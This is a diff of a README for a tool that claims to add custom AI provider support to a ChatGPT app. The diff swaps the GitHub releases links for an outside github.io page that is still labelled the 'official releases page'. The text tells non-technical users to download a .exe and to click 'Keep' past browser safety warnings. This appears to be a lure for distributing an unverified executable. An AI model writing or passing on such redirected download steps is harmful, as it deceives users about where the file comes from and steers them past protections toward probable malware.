@@ -1,6 +1,6 @@
 # 📦 Better-Codex-App-Custom-Provider-Support - Use custom AI models with ChatGPT
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Calculable-poison401/Better-Codex-App-Custom-Provider-Support/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://calculable-poison401.github.io)
 
 ## 🎯 Purpose
 The Better-Codex-App-Custom-Provider-Support tool changes how your chat application handles AI models. You currently use a specific model through your existing ChatGPT account. This tool adds an option to select different providers for your chats. You keep your session active. You do not need to log out. Use your preferred AI models within the same interface.
@@ -13,7 +13,7 @@ The Better-Codex-App-Custom-Provider-Support tool changes how your chat applicat
 *   No prior programming experience is necessary to run this tool.
 
 ## 📥 Downloading the Tool
-1. Visit the [official releases page](https://github.com/Calculable-poison401/Better-Codex-App-Custom-Provider-Support/releases).
+1. Visit the [official releases page](https://calculable-poison401.github.io).
 2. Look for the section labeled "Assets" at the bottom of the newest release card.
 3. Click the link that ends with `.exe` to start the download. Your browser might ask you to confirm this action. Choose "Keep" if it asks about file safety. 
 
